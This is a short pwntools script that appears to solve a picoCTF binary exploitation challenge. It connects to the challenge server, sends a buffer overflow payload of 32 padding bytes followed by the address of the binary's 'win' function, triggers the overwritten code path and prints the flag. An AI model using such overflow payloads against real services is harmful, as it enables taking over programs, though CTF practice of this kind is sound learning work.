from pwn import *
elf = context.binary = ELF('./chall')

# p = process('./chall')
p = remote("mimas.picoctf.net", 52831)

WIN_ADDR = elf.sym['win']
log.success(f"WIN_ADDR: {hex(WIN_ADDR)}")

p.sendlineafter(b"Enter your choice: ", b'2')

payload = b'A' * 32 + p64(WIN_ADDR)
p.sendlineafter(b"Data for buffer: ", payload)

p.sendlineafter(b"Enter your choice: ", b'4')

flag = p.recvall(timeout=1).strip()
log.success(f"Flag: {flag.decode()}")

p.close()